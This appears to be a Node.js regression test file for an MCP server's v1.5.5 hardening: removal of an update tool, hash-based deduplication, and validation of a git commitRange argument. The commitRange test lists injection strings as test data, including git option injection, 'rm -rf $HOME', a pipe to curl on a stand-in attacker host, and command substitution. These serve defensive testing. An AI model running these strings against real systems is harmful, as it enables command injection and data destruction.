// Regression tests for v1.5.5 fix wave — agent G4b scope, server.js cluster.
// Covers:
//   V155-017 — ijfw_update_apply retired from MCP TOOLS array, switch, and
//              runtime-mediator gate.
//   V155-021 — appendStructuredToKnowledge content-hash dedup (mirrors
//              importers/cli.js:appendKnowledge sha12 sentinel).
//   V155-022 — ijfw_cross_audit_converge commitRange shape validation.
//
// Run: node --test test-v155-server-hardening.js

import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';

import { toolNameToActionTarget } from './src/runtime-mediator.js';

const __dirname = dirname(fileURLToPath(import.meta.url));
const SERVER_JS = readFileSync(join(__dirname, 'src', 'server.js'), 'utf8');
const RUNTIME_MEDIATOR = readFileSync(join(__dirname, 'src', 'runtime-mediator.js'), 'utf8');
const TOOLS_MD = readFileSync(join(__dirname, 'TOOLS.md'), 'utf8');

describe('V155-017: ijfw_update_apply retired from MCP surface', () => {
  it('server.js no longer imports from ./update-apply.js', () => {
    assert.equal(
      /from '\.\/update-apply\.js'/.test(SERVER_JS),
      false,
      'expected no import from ./update-apply.js in server.js',
    );
  });

  it('server.js no longer has UPDATE_APPLY_TOOL as a live TOOLS entry', () => {
    // A bare line `  UPDATE_APPLY_TOOL,` (i.e. inside the TOOLS array) would
    // re-register the tool. Forensic comments using the symbol name in a `//`
    // are fine — what we forbid is the standalone-line live reference.
    assert.equal(
      /^\s*UPDATE_APPLY_TOOL,\s*$/m.test(SERVER_JS),
      false,
      'expected no live UPDATE_APPLY_TOOL entry in TOOLS array',
    );
    // Likewise no usage as a callable / value reference.
    assert.equal(
      /\bijfwUpdateApply\b/.test(SERVER_JS),
      false,
      'expected no live ijfwUpdateApply call in server.js',
    );
  });

  it('server.js has no live switch case for ijfw_update_apply', () => {
    // Live case == `case 'ijfw_update_apply': {`. Comments referring to the
    // retired name (for forensic clarity) are fine.
    assert.equal(
      /case 'ijfw_update_apply':\s*\{/.test(SERVER_JS),
      false,
      'expected no live case for ijfw_update_apply',
    );
  });

  it('runtime-mediator returns null for the retired tool name', () => {
    assert.equal(toolNameToActionTarget('ijfw_update_apply', {}), null);
  });

  it('runtime-mediator source no longer has a case for the retired name', () => {
    assert.equal(
      /case 'ijfw_update_apply':/.test(RUNTIME_MEDIATOR),
      false,
      'expected no live case in runtime-mediator.js for ijfw_update_apply',
    );
  });

  it('TOOLS.md advertises 13 active tools (down from 14)', () => {
    assert.ok(
      /Active tools \(13\/14\)/.test(TOOLS_MD),
      'expected "Active tools (13/14)" in TOOLS.md',
    );
  });
});

describe('V155-022: commitRange shape validation', () => {
  // We can't run the full MCP CallTool path in a unit test without spawning
  // the server, but we can recompile the same validation predicate here so
  // any future drift in server.js's shape is caught at test time.
  function isValidCommitRange(cr) {
    if (typeof cr !== 'string' || !cr) return false;
    if (cr.length > 200) return false;
    if (cr.startsWith('-')) return false;
    if (/[\s;|`$\\]/.test(cr)) return false;
    if (!/^[A-Za-z0-9_./@^~:-]+$/.test(cr)) return false;
    return true;
  }

  const ATTACKS = [
    '--upload-pack=touch /tmp/pwn HEAD..HEAD',
    '--config=core.fsmonitor=cmd',
    "HEAD; rm -rf $HOME",
    'HEAD | curl evil.example.com',
    'HEAD`whoami`',
    'HEAD$IFS$(id)',
    '\n--upload-pack=evil',
    'HEAD\\..HEAD',
    '-fakerange',
    ' HEAD..HEAD', // leading space
  ];

  const VALIDS = [
    'HEAD',
    'HEAD~5..HEAD',
    'abc1234',
    'abc1234..def5678',
    'abc1234...def5678',
    'v1.5.4..HEAD',
    'main..feat/v1.5.5',
    'release/1.5.5',
  ];

  it('rejects shell-meta and option-style commitRange', () => {
    for (const a of ATTACKS) {
      assert.equal(
        isValidCommitRange(a), false,
        `expected reject for ${JSON.stringify(a)}`,
      );
    }
  });

  it('accepts canonical SHA/range/ref shapes', () => {
    for (const v of VALIDS) {
      assert.equal(
        isValidCommitRange(v), true,
        `expected accept for ${JSON.stringify(v)}`,
      );
    }
  });

  it('server.js encodes the same validation regex', () => {
    // The exact regex literal must appear in server.js so this test catches
    // drift if the production gate diverges from the modelled rule above.
    assert.ok(
      /\/\^\[A-Za-z0-9_\.\/@\^~:-\]\+\$\//.test(SERVER_JS),
      'expected SHA/ref allowlist regex in server.js commitRange handling',
    );
    assert.ok(
      /\.startsWith\('-'\)/.test(SERVER_JS),
      'expected leading-dash refusal in server.js commitRange handling',
    );
  });
});

describe('V155-021: appendStructuredToKnowledge content-hash dedup', () => {
  it('server.js has hash sentinel logic in the knowledge writer', () => {
    // Must include both the sha hash construction and the existing-content
    // skip path.
    assert.ok(
      /createHash\('sha256'\)\.update\(String\(content/.test(SERVER_JS),
      'expected sha256 hash over content in appendStructuredToKnowledge',
    );
    assert.ok(
      /<!-- hash:\$\{hash\} -->/.test(SERVER_JS),
      'expected hash sentinel comment template in appendStructuredToKnowledge',
    );
    assert.ok(
      /deduped:\s*true/.test(SERVER_JS),
      'expected deduped:true return for skip path',
    );
  });
});
